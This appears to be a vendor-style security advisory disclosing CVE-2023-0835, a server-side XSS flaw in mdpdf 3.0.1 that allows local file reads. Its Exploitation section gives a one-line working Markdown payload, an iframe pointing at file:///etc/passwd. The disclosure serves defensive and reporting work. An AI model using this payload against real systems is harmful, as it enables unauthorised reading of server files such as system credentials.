---
slug: advisories/relsb/
title: mdpdf 3.0.1 - Local File Read via Server Side XSS
authors: Carlos Bello
writer: cbello
codename: relsb
product: mdpdf 3.0.1 - Local File Read
date: 2023-02-20 12:00 COT
cveid: CVE-2023-0835
severity: 7.5
description: mdpdf 3.0.1  -  Local File Read via Server Side XSS
keywords: Fluid Attacks, Security, Vulnerabilities, Markdown, PDF, LFR
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | mdpdf 3.0.1 - Local File Read                                      |
| **Code name**         | [RelsB](https://en.wikipedia.org/wiki/Rels_B)                      |
| **Product**           | mdpdf                                                              |
| **Affected versions** | Version 3.0.1                                                      |
| **State**             | Public                                                             |
| **Release date**      | 2023-02-20                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Server Side XSS                                                                                                             |
| **Rule**              | [425. Server Side XSS](https://docs.fluidattacks.com/criteria/vulnerabilities/425)                                          |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                                                                                |
| **CVSSv3 Base Score** | 7.5                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2023-0835](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0835)                                               |

## Description

mdpdf version 3.0.1 allows an external attacker to remotely obtain
arbitrary local files. This is possible because the application does not
validate the Markdown content entered by the user.

## Vulnerability

This vulnerability occurs because the application does not validate that
the Markdown content entered by the user is not malicious.

## Exploitation

To exploit this vulnerability, we only need to send the following malicious
Markdown to mdpdf:

### Exploit.md

```html
<iframe width="500" height="500" src=file:///etc/passwd></iframe>
```

Thus, when mdpdf parses the malicious Markdown, it will return the local
file specified in the generated PDF.

## Evidence of exploitation

![Explotation-mdpdf](https://rb.gy/evsbdp)

![LFR-Node-PDF](https://user-images.githubusercontent.com/51862990/218873920-d651c3a7-278b-431f-a5ed-04822b581105.png)

## Our security policy

We have reserved the ID CVE-2023-0835 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: mdpdf 3.0.1

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://www.npmjs.com/package/mdpdf/>

## Timeline

<time-lapse
  discovered="2023-02-14"
  contacted="2023-02-14"
  replied="2023-02-14"
  confirmed=""
  patched=""
  disclosure="">
</time-lapse>
